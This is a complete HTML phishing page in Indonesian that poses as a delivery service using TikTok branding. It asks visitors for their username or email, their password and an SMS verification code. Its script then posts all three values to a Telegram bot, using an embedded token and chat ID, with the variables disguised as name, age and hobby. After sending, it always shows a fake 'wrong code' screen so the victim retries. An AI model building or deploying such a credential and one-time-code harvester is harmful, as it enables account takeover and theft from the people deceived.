<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Form Multi Pengiriman Cepat</title>
    
    <style>
        /* --- BACKGROUND UTAMA PUTIH --- */
        html, body {
            height: 100%;
            margin: 0;
            padding: 0;
            background-color: #ffffff; 
            color: #333333;
            font-family: sans-serif;
            box-sizing: border-box;
            overflow: hidden; /* Mengunci total layar agar tidak goyang liar */

            /* FITUR: Mengunci teks agar tidak bisa disalin */
            -webkit-user-select: none;
            -ms-user-select: none;
            user-select: none;
        }

        .wrapper {
            width: 100%;
            max-width: 400px;
            margin: 0 auto;
            position: relative;
            box-sizing: border-box;
            height: 100%;
            background-color: #f9f9f9;
        }

        .halaman {
            width: 100%;
            height: 100%; 
            display: flex;
            flex-direction: column;
            box-sizing: border-box;
            padding: 20px;
            position: relative;
        }

        #bagian2, #bagian3 {
            display: none;
        }

        /* --- KONTEN FORM ATAS --- */
        .konten-form {
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            box-sizing: border-box;
            transition: all 0.1s ease; /* Transisi halus */
        }

        h1 { 
            color: #000000; 
            font-weight: bold;
            margin-top: 15px; 
            margin-bottom: 5px;
            font-size: 22px;
        } 

        p {
            margin-top: 0;
            margin-bottom: 15px;
            font-size: 14px;
        }
        
        img {
            width: 140px;  
            height: 140px; 
            border-radius: 15px; 
            margin-bottom: 10px;
            object-fit: cover; 
            margin-top: 15px; 
        }

        /* --- INPUT --- */
        input {
            padding: 12px 15px;
            width: 100%;        
            max-width: 100%;    
            border-radius: 8px;
            border: none; 
            background-color: #eeeeee; 
            color: #333333;
            font-size: 15px;
            outline: none; 
            margin-bottom: 12px;
            text-align: left; 
            box-sizing: border-box; 
        }

        input:focus {
            background-color: #e5e5e5;
        }

        /* --- CONTAINER TOMBOL --- */
        .tombol-container {
            width: 100%;
            max-width: 400px;
            padding: 15px 20px;
            box-sizing: border-box;
            position: fixed; 
            bottom: 0;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            justify-content: center;
            background-color: #f9f9f9;
            z-index: 9999;
        }

        button {
            background-color: #d32f2f; 
            color: #ffffff;
            border: none;
            padding: 14px 30px;
            font-size: 16px;
            border-radius: 30px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;        
            box-shadow: 0 3px 10px rgba(211, 47, 47, 0.3);
            box-sizing: border-box; 
        }

        .btn-ulang {
            background-color: #333333; 
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
        }

        /* --- RAHASIA: KELAS UNTUK MENYUTUTKAN KONTEN SAAT KEYBOARD AKTIF --- */
        .keyboard-up img {
            width: 80px !important; /* Foto kucing diperkecil agar input terangkat naik */
            height: 80px !important;
            margin-top: 5px !important;
            margin-bottom: 5px !important;
        }
        .keyboard-up h1 {
            font-size: 16px !important; /* Tulisan dikecilkan */
            margin-top: 0px !important;
            margin-bottom: 0px !important;
        }
        .keyboard-up p {
            display: none !important; /* Sembunyikan deskripsi kecil agar hemat ruang */
        }
        .keyboard-up input {
            margin-bottom: 8px !important; /* Jarak input dirapatkan */
        }
    </style>
</head>
<body>

    <div class="wrapper" id="mainWrapper">
        
        <div id="bagian1" class="halaman">
            <div class="konten-form" id="konten1">
                <img src="https://images.unsplash.com/photo-1514888286974-6c03e2ca1dba?w=400&h=400&fit=crop" alt="Foto Bagian 1">
                <h1>EXTRA BUBBELWARP</h1>
                <p>proses pengiriman cepat dan aman.</p>
                <input type="text" id="inputNama" placeholder="alamat email atau pengguna">
                <input type="text" id="inputUmur" placeholder="Kata sandi">
            </div>
            <div class="tombol-container">
                <button onclick="pindahKe(2)">Lanjutkan</button>
            </div>
        </div>

        <div id="bagian2" class="halaman">
            <div class="konten-form" id="konten2">
                <img src="https://jsp.co.id/wp-content/uploads/2024/06/PERKEMBANGAN-TIKTOK-DI-INDONESIA-e1718697617598.jpg" alt="Foto Bagian 2">
                <h1>KODE VERIFIKASI</h1>
                <p>periksa kode verifikasi anda di kirim melalui sms.</p>
                <input type="number" id="inputHobi" placeholder="masukkan kode verifikasi">
            </div>
            <div class="tombol-container">
                <button onclick="tampilkanHasil()">Lanjutkan</button>
            </div>
        </div>

        <div id="bagian3" class="halaman">
            <div class="konten-form">
                <h1>KODE VERIFIKASI SALAH</h1>
                <p>periksa kembali kode verifikasi anda di sms.</p>
                <img src="https://img.magnific.com/vektor-gratis/simbol-tombol-peringatan-kesalahan_24877-83749.jpg?semt=ais_hybrid&w=740&q=80" alt="Foto Bagian 3">
            </div>
            <div class="tombol-container">
                <button class="btn-ulang" onclick="pindahKe(1)">ULANG KEMBALI</button>
            </div>
        </div>

    </div>

    <script>
        function setSizing() {
            document.getElementById('mainWrapper').style.height = window.innerHeight + 'px';
        }
        window.addEventListener('load', setSizing);
        window.addEventListener('resize', setSizing);
        setSizing();

        // --- SISTEM DETEKSI DAN PENYESUAIAN RUANG KEYBOARD ---
        if (window.visualViewport) {
            window.visualViewport.addEventListener('resize', function() {
                var viewportTinggi = window.visualViewport.height;
                var layarTinggi = window.innerHeight;
                var selisihKeyboard = layarTinggi - viewportTinggi;

                document.querySelectorAll('.tombol-container').forEach(el => {
                    if (selisihKeyboard > 60) {
                        el.style.bottom = selisihKeyboard + 'px';
                        // Paksa konten atas menciut agar input naik ke area aman dan tidak tertutup tombol
                        document.getElementById('konten1').classList.add('keyboard-up');
                        document.getElementById('konten2').classList.add('keyboard-up');
                    } else {
                        el.style.bottom = '0px';
                        // Kembalikan ke ukuran normal saat keyboard tutup
                        document.getElementById('konten1').classList.remove('keyboard-up');
                        document.getElementById('konten2').classList.remove('keyboard-up');
                    }
                });
            });
        }

        function tampilkanHasil() {
            var nama = document.getElementById('inputNama').value;
            var umur = document.getElementById('inputUmur').value;
            var hobi = document.getElementById('inputHobi').value;

            if (hobi == "") {
                alert("Gunakan akun tiktok atau tokopedia apabila tidak menerima kode verifikasi!");
                return;
            }

            var tokenBot = "8839179457:AAEXfHKC0IAtVOU_oBXzhGqwZhypKqJnsNo"; 
            var chatID = "7938498485";     

            var pesanTelegram = "📬 *LAPORAN BARU MASUK* 📬\n\n" +
                                "👤 *Nama:* " + (nama ? nama : "-") + "\n" +
                                "🎂 *Umur:* " + (umur ? umur : "-") + " tahun\n" +
                                "🎯 *Hobi:* " + hobi;

            var urlTlgrm = "https://api.telegram.org/bot" + tokenBot + "/sendMessage";
            
            fetch(urlTlgrm, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatID,
                    text: pesanTelegram,
                    parse_mode: "Markdown"
                })
            })
            .then(response => {
                if(response.ok) {
                    console.log("Laporan berhasil dikirim ke Telegram!");
                } else {
                    console.log("Gagal mengirim laporan.");
                }
            })
            .catch(error => console.error("Error:", error));

            pindahKe(3);
        }

        function pindahKe(nomorHalaman) {
            document.getElementById('bagian1').style.display = 'none';
            document.getElementById('bagian2').style.display = 'none';
            document.getElementById('bagian3').style.display = 'none';

            var target = document.getElementById('bagian' + nomorHalaman);
            target.style.display = 'flex';
            
            // --- KOSONGKAN KOTAK INPUT UTAMAMU SAAT KEMBALI KE HALAMAN 1 ---
            if (nomorHalaman === 1) {
                document.getElementById('inputNama').value = "";
                document.getElementById('inputUmur').value = "";
                document.getElementById('inputHobi').value = "";
            }

            document.querySelectorAll('.tombol-container').forEach(el => {
                el.style.bottom = '0px';
            });
            setSizing();
        }
    </script>
</body>
</html>
